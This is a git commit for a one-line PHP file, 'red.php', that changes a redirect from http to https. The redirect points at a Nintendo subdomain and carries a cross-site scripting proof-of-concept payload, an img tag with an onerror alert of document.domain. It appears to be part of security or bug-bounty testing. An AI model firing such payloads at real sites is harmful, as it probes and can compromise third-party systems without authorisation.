334292a5c4a95a4a097b38e1c926b987ffda9094
missoum1307 <missoum1307@users.noreply.github.com>
2019-09-09 00:29:54 +0100

    Update red.php

--- red.php
+++ red.php
@@ -1,1 +1,1 @@
-<?php header('Location: http://500bd53d90610f7fa5ba42cc27348bd9-sb.baas.nintendo.com/<img src=x onerror=alert(document.domain)>'); ?> 
+<?php header('Location: https://500bd53d90610f7fa5ba42cc27348bd9-sb.baas.nintendo.com/<img src=x onerror=alert(document.domain)>'); ?> 
